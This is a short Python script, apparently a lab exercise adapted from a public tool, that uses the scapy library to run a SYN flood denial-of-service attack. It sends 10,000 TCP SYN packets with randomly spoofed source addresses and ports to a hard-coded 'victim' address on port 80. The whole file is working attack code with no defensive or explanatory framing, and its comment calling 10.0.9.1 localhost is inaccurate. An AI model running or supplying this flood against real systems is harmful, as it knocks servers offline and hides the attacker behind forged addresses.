# inspire from: https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py

import random
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send


def randomIP():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def randomPort():
    return random.randint(1000, 9000)


def synFlood(victim_ip, victim_port):
    for packet in range(10000):
        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = victim_ip

        TCP_Packet = TCP()
        TCP_Packet.sport = randomPort()
        TCP_Packet.dport = victim_port

        pkt = IP_Packet / TCP_Packet
        send(pkt)


victim_ip = '10.0.9.1'  # the victim is localhost
victim_port = 80  # apache server is port 80
synFlood(victim_ip, victim_port)
